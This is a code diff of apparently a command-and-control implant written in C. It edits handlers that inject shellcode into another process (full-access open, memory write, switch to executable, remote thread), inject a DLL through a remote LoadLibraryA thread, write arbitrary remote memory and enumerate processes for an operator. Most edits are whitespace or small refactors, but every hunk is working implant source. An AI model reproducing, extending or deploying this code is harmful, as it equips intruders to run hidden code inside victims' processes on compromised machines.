@@ -88,7 +88,7 @@ FUNC VOID CmdInjectionClassic(
 ) {
     BK_PACKAGE = PackageCreate( COMMAND_CLASSIC );
 
-    DWORD  bkErrorCode = 0;
+    DWORD  bkErrorCode =  0;
     HANDLE ProcessHandle  = NULL;
     DWORD  ProcessId      = ParserGetInt32( Parser );
     DWORD  RegionSize     = 0;
@@ -97,23 +97,23 @@ FUNC VOID CmdInjectionClassic(
     DWORD  ThreadId       = 0;
     HANDLE ThreadHandle   = NULL;
 
-    bkErrorCode = bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
+    bkErrorCode =  bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
     if ( bkErrorCode != 0 ) 
        goto _Leave;
 
-    bkErrorCode = bkMemAlloc( ProcessHandle, &MemAllocated, RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    bkErrorCode =  bkMemAlloc( ProcessHandle, &MemAllocated, RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( bkErrorCode != 0 ) 
        goto _Leave;
 
-    bkErrorCode = bkMemWrite( ProcessHandle, MemAllocated, ShellcodeBytes, RegionSize );
+    bkErrorCode =  bkMemWrite( ProcessHandle, MemAllocated, ShellcodeBytes, RegionSize );
     if ( bkErrorCode != 0 ) 
        goto _Leave;
 
-    bkErrorCode = bkMemProtect( ProcessHandle, MemAllocated, RegionSize, PAGE_EXECUTE_READ );
+    bkErrorCode =  bkMemProtect( ProcessHandle, MemAllocated, RegionSize, PAGE_EXECUTE_READ );
     if ( bkErrorCode != 0 )
        goto _Leave;
 
-    bkErrorCode = bkThreadCreate( ProcessHandle, MemAllocated, NULL, NULL, NULL, &ThreadId, &ThreadHandle );
+    bkErrorCode =  bkThreadCreate( ProcessHandle, MemAllocated, NULL, NULL, NULL, &ThreadId, &ThreadHandle );
     if ( bkErrorCode != 0 )
        goto _Leave;
 
@@ -136,7 +136,7 @@ FUNC VOID CmdMemory(
 ) {    
     M_MEM MemOp = ParserGetInt32( Parser );
     BK_PACKAGE  = PackageCreate( COMMAND_MEMORY );
-    DWORD bkErrorCode   = 0;
+    UINT32 bkErrorCode = 0;
 
     switch ( MemOp ) {
         case ALLOC: {
@@ -145,7 +145,7 @@ FUNC VOID CmdMemory(
             UINT64 RegionSize    = ParserGetInt64( Parser );
             DWORD  Protection    = ParserGetInt32( Parser );
 
-            bkErrorCode = bkMemAlloc( ProcessHandle, &BaseAddr, RegionSize, 0x3000, Protection );
+            bkErrorCode =  bkMemAlloc( ProcessHandle, &BaseAddr, RegionSize, 0x3000, Protection );
             if (bkErrorCode != 0) {
                 PackageTransmitError(bkErrorCode);
                 return;
@@ -161,7 +161,7 @@ FUNC VOID CmdMemory(
             UINT32 BufferSize    = 0;
             PBYTE  Buffer        = ParserGetBytes( Parser, &BufferSize );
 
-            bkErrorCode = bkMemWrite( ProcessHandle, MemBaseAddr, Buffer, BufferSize );
+            bkErrorCode =  bkMemWrite( ProcessHandle, MemBaseAddr, Buffer, BufferSize );
             if (bkErrorCode != 0) {
                 PackageTransmitError( bkErrorCode );
                 return;
@@ -269,23 +269,23 @@ FUNC VOID CmdDllInjection(
     
     HANDLE ProcessHandle = NULL;
     HANDLE ThreadHandle  = NULL;
-    UINT32 bkErrorCode   = 0;
+    UINT32 bkErrorCode = 0;
     PVOID  MemoryAlloc   = NULL;
 
     BK_PRINT( "proc id %d dllpath %s\n", ProcessId, DllPath );
 
     if ( ProcessId != 0 ) {
-        bkErrorCode = bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
+        bkErrorCode =  bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
         if ( bkErrorCode != 0 ) goto _Leave;
     }
 
-    bkErrorCode = bkMemAlloc( ProcessHandle, &MemoryAlloc, StringLengthA( DllPath ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    bkErrorCode =  bkMemAlloc( ProcessHandle, &MemoryAlloc, StringLengthA( DllPath ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( bkErrorCode != 0 ) goto _Leave;
 
-    bkErrorCode = bkMemWrite( ProcessHandle, MemoryAlloc, DllPath, StringLengthA( DllPath ) );
+    bkErrorCode =  bkMemWrite( ProcessHandle, MemoryAlloc, DllPath, StringLengthA( DllPath ) );
     if ( bkErrorCode != 0 ) goto _Leave;
 
-    bkErrorCode = bkThreadCreate( ProcessHandle, Instance()->Win32.LoadLibraryA, MemoryAlloc, 0, 0, 0, &ThreadHandle );
+    bkErrorCode =  bkThreadCreate( ProcessHandle, Instance()->Win32.LoadLibraryA, MemoryAlloc, 0, 0, 0, &ThreadHandle );
     if ( bkErrorCode != 0 ) goto _Leave;
 
 _Leave:
@@ -315,7 +315,7 @@ FUNC VOID CmdProcEnum(
 
     BK_PACKAGE = PackageCreate( COMMAND_PROCLIST );
 
-    DWORD  bkErrorCode         = 0;
+    DWORD  bkErrorCode = 0;
     DWORD  ReturnLen1  = 0;
     PVOID  ValToFree   = NULL;
     PSTR   UserBuff    = 0;
@@ -329,18 +329,19 @@ FUNC VOID CmdProcEnum(
 
     Instance()->Win32.NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen1 );
 
-    Spi = bkHeapAlloc( ReturnLen1 );
+    Spi = Instance()->Win32.LocalAlloc( LPTR, ReturnLen1 );
 
     ValToFree = Spi;
 
-    bkErrorCode = Instance()->Win32.NtQuerySystemInformation( SystemProcessInformation, Spi, ReturnLen1, &ReturnLen1 );
+    bkErrorCode =  Instance()->Win32.NtQuerySystemInformation( SystemProcessInformation, Spi, ReturnLen1, &ReturnLen1 );
     if ( bkErrorCode != STATUS_SUCCESS ) {
         PackageTransmitError( bkErrorCode );
         return;
     }
 
+    Spi = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( Spi ) + Spi->NextEntryOffset );        
 
-    Spi = (PSYSTEM_PROCESS_INFORMATION)( U_PTR(Spi) + Spi->NextEntryOffset );        
+    BK_PRINT( "id %d\n", Spi->UniqueProcessId );
 
     while ( 1 ) {
 
@@ -351,7 +352,7 @@ FUNC VOID CmdProcEnum(
 
         GetTokenUserA( TokenHandle, &UserBuff, &UserBuffLen );
 
-        bkErrorCode = Instance()->Win32.NtQueryInformationProcess( 
+        bkErrorCode =  Instance()->Win32.NtQueryInformationProcess( 
             UlongToHandle( Spi->UniqueProcessId ), ProcessBasicInformation,
             &Ebi, sizeof( PROCESS_EXTENDED_BASIC_INFORMATION ), NULL 
         ); 
@@ -369,7 +370,7 @@ FUNC VOID CmdProcEnum(
         Spi = (PSYSTEM_PROCESS_INFORMATION)( U_PTR(Spi) + Spi->NextEntryOffset );        
     }
 
-    bkHeapFree( ValToFree, ReturnLen1 );
+    //bkHeapFree( ValToFree, ReturnLen1 );
 
     PackageTransmit( BK_PACKAGE, NULL, NULL );
 }
